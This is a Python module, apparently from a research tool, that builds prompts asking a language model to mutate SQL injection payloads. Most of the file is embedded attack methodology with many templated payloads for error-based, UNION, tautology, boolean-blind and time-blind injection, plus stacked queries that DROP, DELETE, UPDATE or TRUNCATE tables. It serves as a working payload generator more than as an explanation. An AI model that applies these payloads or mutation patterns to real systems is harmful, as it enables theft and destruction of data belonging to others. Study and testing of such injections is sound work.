"""Render Jinja2 mutation prompts and expose their technical guidance."""

from __future__ import annotations

from pathlib import Path

from cosqli.utils.j2_operation import load_prompt_template

from .type_identifier import Technique


MUTATION_PROMPTS_DIR = Path(__file__).resolve().parents[4] / "prompts" / "mutation"


def render_mutation_prompt(
    prompt_type: str,
    *,
    technique: str,
    reference_scope: str,
    payload: str,
    dimensions: str,
    memory_addons: str,
) -> str:
    """Render a mutation prompt from the canonical Jinja2 template set."""
    filename = {
        "type_focused": "attack_form.j2",
        "info_focused": "sql_structure.j2",
    }.get(prompt_type)
    if filename is None:
        raise ValueError(f"Unsupported mutation prompt type: {prompt_type!r}")
    return load_prompt_template(str(MUTATION_PROMPTS_DIR), filename).render(
        technique=technique,
        reference_scope=reference_scope,
        payload=payload,
        dimensions=dimensions,
        memory_addons=memory_addons,
    )



# ============================================================
# Technique-Aware Mutation Dimensions
# With detailed attack methodology explanations
# ============================================================

ERROR_BASE_DIMENSIONS = """
## Error-Based SQL Injection Attack Methodology

**Core Principle:** Error-based attacks exploit database error messages to extract information. 
The attacker intentionally triggers database errors, and the error message often contains 
sensitive data (table names, column values, system info) that the attacker wants to extract.

### 1. Type Conversion Attacks (CAST/CONVERT)
**Why it works:** When you force a STRING value to be converted to a NUMERIC type, the database 
will try to convert it and FAIL, producing an error message that INCLUDES the original string value.

**Functions:** CAST(X AS UNSIGNED), CAST(X AS DECIMAL), CAST(X AS SIGNED), CONVERT(X, UNSIGNED)

**Reference examples:**
- `' AND CAST('abc' AS UNSIGNED) = 1`
- `' AND CONVERT($sysInfo$, UNSIGNED)>$int$`
- `' AND CAST((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) AS DECIMAL) = $float$`

### 2. Implicit Type Conversion Attacks
**Why it works:** When you compare a STRING with a NUMBER using comparison operators, 
the database performs implicit type conversion, triggering an error containing the string value.

**Operators:** =, >, <, >=, <=, BETWEEN...AND, !=, <>, IN(...), arithmetic operators (+, -, *, /)

**Reference examples:**
- `' AND 'simple example' + 0`
- `' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$`

### 3. Math Function Attacks
**Why it works:** Math functions expect NUMERIC inputs. Passing a STRING or invalid value 
causes an error that may reveal the input value.

**Functions:** SQRT(X), LOG(X), LOG2(X), LOG10(X), LN(X), MOD(X, Y), Division (X/0)

**Reference examples:**
- `' AND SQRT(-1)`
- `' AND 1/(SELECT 0)`
- `' AND SQRT($sysInfo$)`
- `' AND SQRT(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)`

### 4. XML Function Attacks (MySQL Specific)
**Why it works:** extractvalue() and updatexml() parse XML and throw errors with 
specific XPATH syntax errors that include the payload content.

**Functions:** extractvalue(xml, xpath), updatexml(xml, xpath, new_value)

**Reference examples:**
- `' AND extractvalue(1,concat(0x1fde75d7,'daiodww',0x1fde75d7))`
- `' AND extractvalue(1,concat($hex$,($sysInfo$),$hex$))`
- `' AND extractvalue(1,concat($hex$,(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$hex$))`

### 5. GTID Function Attacks (MySQL 5.6+)
**Why it works:** GTID functions expect specific format. Invalid input causes descriptive errors.

**Functions:** GTID_SUBSET(set1, set2), GTID_SUBTRACT(set1, set2)

**Example patterns:**
- constant: `' AND GTID_SUBSET('learning',1) = 1`
- system info: `' AND GTID_SUBSET(($sysInfo$),$character$)=1`
- specific db: `' AND GTID_SUBSET((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$int$) = 1`

### 6. String Function Attacks
**Why it works:** String functions with invalid arguments cause errors that may reveal data.

**Functions:** SUBSTR(X, start, length), MID(X, pos, len)

**Example patterns:**
- constant: `' AND SUBSTR('test', 1, -1)`, `' AND SUBSTR('test', 'fly', 1)`
- system info: `' AND SUBSTR($sysInfo$, $int$, $int$)=$character$`

### 7. Date/Time Function Attacks
**Why it works:** Date/time functions expect valid format. Invalid input reveals data in error.

**Functions:** TIME(X), DATE(X), TO_DAYS(X)

**Reference examples:**
- `' AND TIME($sysInfo$)=$time$`
- `' AND TIME(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $time$`

### 8. Overflow Attacks
**Why it works:** Integer/float overflow causes specific errors.

**Reference examples(constant only):**
- `' AND (SELECT 9223372036854775807 + 1)` (integer overflow)
- `' AND (SELECT -9223372036854775808 - 1)` (integer underflow)
- `' AND (SELECT 1.7976931348623157e+308 * 2)` (float overflow)
"""


UNION_QUERY_DIMENSIONS = """
## Union-Based SQL Injection Attack Methodology

**Core Principle:** UNION attacks append additional SELECT queries to the original query, 
allowing attackers to retrieve data from other tables. The key challenge is matching 
the column count and types of the original query.

### 1. Column Count Detection (constant)
**Why it's needed:** UNION requires both queries to have the SAME number of columns.
Attackers first probe to find how many columns the original query returns.

**ORDER BY Method:** `' ORDER BY 1` (increase number until error)
**GROUP BY Method:** `' GROUP BY 1`, increase number until error and with optional HAVING clause

### 2. UNION Variants
- `UNION SELECT`: Standard union, removes duplicate rows
- `UNION ALL SELECT`: Keeps all rows including duplicates
- `UNION DISTINCT SELECT`: Explicit distinct

### 3. SELECT Content (constant)
**Why NULL is useful:** NULL is type-agnostic, works when column type is unknown.

**Reference examples:**
- `' UNION SELECT NULL`
- `' UNION SELECT 'name'`
- `' UNION SELECT 36282`

### 4. System Information Extraction
**Reference examples:**
- `' UNION ALL $sysInfo$`

### 5. Specific Database Extraction
**Reference examples:**
- `' UNION SELECT $column_t1_1$ FROM $table_1$`

**Note:** You can explore adding WHERE conditions, using UNION ALL vs UNION, or creating multi-table JOINs.
- `' UNION SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$`
- `' UNION SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$`
"""


TAUTOLOGIES_DIMENSIONS = """
## Tautology-Based SQL Injection Attack Methodology

**Core Principle:** Tautology attacks inject conditions that are ALWAYS TRUE, 
bypassing authentication checks or WHERE clauses. The goal is to make the 
overall condition evaluate to TRUE regardless of the original condition.

### 1. Basic Numeric Tautologies
**Why they work:** Simple numeric comparisons that are mathematically always true.
**Reference:** `' OR 1=1`
**Explore:** Different numbers, operators (=, >, <, >=, <=), arithmetic expressions(+,-,*,/,%)

### 2. String Tautologies
**Why they work:** String comparisons that are always true.
**Reference:** `' OR 'a' LIKE '%'`
**Explore:** Different LIKE patterns, REGEXP patterns

### 3. String Function Tautologies
**Why they work:** Using SQL functions to construct always-true conditions.
**Functions:** LENGTH, TRIM, LOWER, UPPER, SUBSTRING, REPLACE, INSTR, LTRIM, RTRIM
**Reference:** `' OR LENGTH('')=0`, `' OR SUBSTRING('test',1,1)='t'`

### 4. Math Function Tautologies
**Why they work:** Mathematical functions with predictable results.
**Functions:** ABS, ROUND, CEIL, FLOOR, LEAST, GREATEST
**Reference:** `' OR ABS(-5)=5`

### 5. NULL Handling Tautologies
**Why they work:** NULL handling functions with known behavior.
**Functions:** COALESCE, IFNULL, ISNULL, NULLIF

### 6. Conditional Tautologies
**Why they work:** Conditional expressions that always evaluate to true.
**Reference:** `' OR IF(1=1,'true','false')='true'`
**Explore:** IF, CASE WHEN structures

### 7. System Information Tautologies
**Reference examples:**
- `' OR ($sysInfo$)>0`
- `' OR ($sysInfo$) REGEXP '[a-z]'`
- `' OR ($sysInfo$)=($sysInfo$)`

**Explore:** Different comparison operators, LIKE, REGEXP, LENGTH, IS NOT NULL, EXISTS, IN(...), BETWEEN...AND, !=, <>, arithmetic operators (+, -, *, /, %), string functions (SUBSTRING, REPLACE, INSTR, LTRIM, RTRIM), math functions (ABS, ROUND, CEIL, FLOOR, LEAST, GREATEST), NULL handling functions (COALESCE, IFNULL, ISNULL, NULLIF), conditional tautologies (IF, CASE WHEN)

### 8. Specific Database Tautologies
**Reference examples:**
- `' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>0`
- `' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$`
- `' OR COALESCE(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)`
- `' OR SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) = $character$`

**Explore:** Single table vs multi-table JOIN, different comparison methods
- `' OR LENGTH(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>0`
- `' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$`
"""


BOOLEAN_INFERENCE_DIMENSIONS = """
## Boolean-Based Blind SQL Injection Attack Methodology

**Core Principle:** When error messages are not visible, attackers use boolean conditions
to infer data bit by bit. The attacker asks "yes/no questions" through SQL conditions
and observes the APPLICATION BEHAVIOR to determine if the condition was true or false.

### 1. Character Extraction Functions
**Functions:** SUBSTR/SUBSTRING, LEFT, RIGHT, MID

### 2. Character-to-Number Conversion
**Functions:** ASCII, ORD (for binary search optimization)

### 3. Comparison Operators
- `=` → Exact match
- `>`, `<` → Range check (binary search)
- `LIKE` → Pattern matching
- `REGEXP` → Complex patterns
- `IN(...)` → Set membership
- `BETWEEN...AND` → Range check

### 4. Length Detection
- `LENGTH(X) > N` → Is the string longer than N?
- `LENGTH(X) = N` → Is the string exactly N characters?

### 5. Conditional Wrappers
- Direct: `' AND condition`
- CASE WHEN: `' AND CASE WHEN condition THEN 1 ELSE 0 END = 1`
- IF: `' AND IF(condition, 1, 0) = 1`

### 6. System Information Patterns
**Reference examples:**
- `' AND ($sysInfo$) REGEXP '[0-9]'`
- `' AND SUBSTR($sysInfo$, 1, 1) > $character$`
- `' AND IF(($sysInfo$)>$int$,1,0)=1`

**Explore:** Different comparison operators, LIKE patterns, character extraction positions

### 7. Specific Database Patterns
**Reference examples:**
- `' AND (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$`
- `' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) LIKE $character$`
- `' AND IF((SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$,1,0) = 1`
- `' AND SUBSTR(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$, 1, 1) > $character$`

**Explore:** Single table vs multi-table JOIN, different conditional wrappers
"""


TIME_INFERENCE_DIMENSIONS = """
## Time-Based Blind SQL Injection Attack Methodology

**Core Principle:** When NEITHER error messages NOR page content differences are visible,
attackers use TIME DELAYS to infer data. If a condition is true, the query waits N seconds;
if false, it returns immediately. By measuring response time, attackers can determine
if conditions are true or false.

### 1. Delay Functions
**SLEEP(N):** Pause for N seconds - simple and reliable
**BENCHMARK(count, operation):** CPU-intensive alternative when SLEEP is blocked
**Heavy queries:** Cartesian joins cause delay through I/O and CPU load

### 2. Conditional Delay Structures
- IF: `IF(condition, SLEEP(5), 0)`
- CASE WHEN: `CASE WHEN condition THEN SLEEP(5) ELSE 0 END`
- Subquery: `(SELECT SLEEP(5) WHERE condition)`

### 3. Constant Patterns
**Reference examples:**
- `' OR SLEEP(5)`
- `' AND IF(191 = 191,SLEEP(5),0)`
- `' AND BENCHMARK(500000,MD5('example'))`

**Explore:** Different conditional structures, EXISTS wrapper, CASE WHEN wrapper, WHERE wrapper, etc.

### 4. System Information Patterns
**Reference examples:**
- `' AND SELECT SLEEP($int$) WHERE ($sysInfo$)>0`
- `' AND SELECT SLEEP($int$) WHERE ($sysInfo$) LIKE $character$`
- `' AND CASE WHEN ($sysInfo$) REGEXP '[a-z]' THEN SLEEP(5) ELSE 0 END`
- `' AND SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR($sysInfo$,1,1) IN ('a','e','i','o','u')`
**Heavy query (Cartesian join):**
- `' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)=45678`
**Explore:** Different conditional structures, character extraction

### 5. Specific Database Patterns
**Reference examples:**
- `' AND IF((SELECT SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,$int$,1)) = $character$,SLEEP($int$),0)`
- `' AND (SELECT SLEEP($int$) WHERE (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $character$`
**Heavy query (Cartesian join):**
- `' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)=$int$`
**Explore:** Single table vs multi-table JOIN, different delay methods (SLEEP vs BENCHMARK)
"""


PIGGYBACK_DIMENSIONS = """
## Piggy-Backed Query (Stacked Query) Attack Methodology

**Core Principle:** Piggy-backed attacks append ADDITIONAL SQL STATEMENTS after the
original query using semicolon (;). This allows executing completely different operations
like DELETE, INSERT, UPDATE, DROP - not just reading data.

**Why it's dangerous:** Unlike other attacks that only READ data, piggy-backed queries
can MODIFY or DESTROY data, create backdoors, or grant privileges.

**Note:** Not all databases support stacked queries. MySQL with mysqli_multi_query() does,
but many other configurations block them.

### SQL Statement Types

**1. SELECT** - Data retrieval
**Reference:** `'; SELECT $column_t1_1$ FROM $table_1$;`

**2. DELETE** - Data deletion
**Reference:** `'; DELETE FROM $table_1$ WHERE $sysInfo$ IS NOT NULL;`, `'; DELETE FROM $table_1$ WHERE $column_t1_1$ = $sample_t1_1$;`

**3. DROP** - Table destruction
**Reference:** `'; DROP TABLE IF EXISTS $table_1$;`

**4. UPDATE** - Data modification
**Reference:** `'; UPDATE $table_1$ SET $column_t1_1$ = $int$ WHERE $column_t1_2$ = $sample_t1_2$;`

**5. INSERT** - Data insertion
**Explore:** INSERT INTO ... SELECT patterns

**6. CREATE** - Table creation
**Explore:** CREATE TABLE ... AS SELECT patterns

**7. TRUNCATE** - Table truncation (faster than DELETE)
**Explore:** TRUNCATE TABLE patterns

### Condition Variations
- **No condition:** Affects ALL rows
- **Simple condition:** `WHERE $column$ = $value$`
- **Existence check:** `WHERE $column$ IS NOT NULL`
"""


# ============================================================
# SQL Structure Mutation Dimensions
# ============================================================

INFO_FEATURE_DIMENSIONS = """
## SQL Structure Mutation Patterns

This section describes various ways to modify the SQL query structure within a payload.
Observe the original payload's structure and choose a DIFFERENT pattern from below.

### Pattern 1: Single Table → Multi-Table JOIN
Transform a simple single-table query into a multi-table JOIN query.

**Before:**
`SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$`

**After (INNER JOIN):**
`SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$`

**JOIN variations:**
- INNER JOIN: Returns rows with matches in both tables
- LEFT JOIN: Returns all rows from left table, matched rows from right
- RIGHT JOIN: Returns all rows from right table, matched rows from left

### Pattern 2: No Condition → Add WHERE Clause
Add filtering conditions to make the query more specific.

**Before:**
`SELECT $column_t1_1$ FROM $table_1$`

**After:**
`SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$`

### Pattern 3: Direct Value → Aggregate Function
Wrap the selected column with aggregate functions.

**Transformations:**
- `SELECT $column_t1_1$` → `SELECT COUNT($column_t1_1$)`
- `SELECT $column_t1_1$` → `SELECT MAX($column_t1_1$)`
- `SELECT $column_t1_1$` → `SELECT MIN($column_t1_1$)`
- `SELECT $column_t1_1$` → `SELECT SUM($column_t1_1$)`
- `SELECT $column_t1_1$` → `SELECT AVG($column_t1_1$)`

### Pattern 4: Direct Value → Outer Function Wrapper
Wrap the entire subquery result with functions.

**Before:**
`(SELECT $column_t1_1$ FROM $table_1$) > 0`

**After:**
- `LENGTH((SELECT $column_t1_1$ FROM $table_1$)) > 0`
- `COUNT((SELECT $column_t1_1$ FROM $table_1$)) > 0`

### Pattern 5: SQL Statement Type Variation (for Piggy-backed attacks)
Change the type of SQL statement being injected.

**Variations:**
- `SELECT $column_t1_1$ FROM $table_1$` - Data retrieval
- `DELETE FROM $table_1$ WHERE $column_t1_1$ = $sample_t1_1$` - Data deletion
- `INSERT INTO temp_table SELECT $column_t1_1$ FROM $table_1$` - Data insertion
- `UPDATE $table_1$ SET $column_t1_1$ = $int$ WHERE $column_t1_2$ = $sample_t1_2$` - Data modification
- `CREATE TABLE temp_data AS SELECT $column_t1_1$ FROM $table_1$` - Table creation
- `TRUNCATE TABLE $table_1$` - Table truncation
- `DROP TABLE IF EXISTS $table_1$` - Table deletion

### Pattern 6: Table Alias Usage
Add or modify table aliases for cleaner syntax.

**Before:**
`FROM $table_1$`

**After:**
- `FROM $table_1$ AS T1` (explicit AS)
- `FROM $table_1$ T1` (implicit alias)

---

## Placeholder Reference

**Tables:** `$table_1$`, `$table_2$`, `$table_3$`
Represent actual table names in the target database.

**Columns:** `$column_tN_M$` where N=table number, M=column number
- `$column_t1_1$` = first column of first table ($table_1$)
- `$column_t2_3$` = third column of second table ($table_2$)

**Sample Values:** `$sample_tN_M$` = sample value for column M of table N
- Must pair with corresponding column: `$column_t1_2$ = $sample_t1_2$`

**Important:** When adding new tables, ensure all related placeholders are consistent:
- $table_2$ must use $column_t2_X$ and $sample_t2_X$ (note the "t2" suffix)
"""


# ============================================================
# Dimension Getter Functions
# ============================================================

def get_type_dimensions(technique: Technique) -> str:
    """Get mutation dimensions for the specified technique."""
    mapping = {
        Technique.ERROR_BASED: ERROR_BASE_DIMENSIONS,
        Technique.UNION_QUERY: UNION_QUERY_DIMENSIONS,
        Technique.TAUTOLOGY: TAUTOLOGIES_DIMENSIONS,
        Technique.BOOLEAN_BLIND: BOOLEAN_INFERENCE_DIMENSIONS,
        Technique.TIME_BLIND: TIME_INFERENCE_DIMENSIONS,
        Technique.PIGGY_BACKED: PIGGYBACK_DIMENSIONS,
    }
    return mapping.get(technique, TAUTOLOGIES_DIMENSIONS)


def get_info_dimensions() -> str:
    """Get query-structure mutation dimensions."""
    return INFO_FEATURE_DIMENSIONS
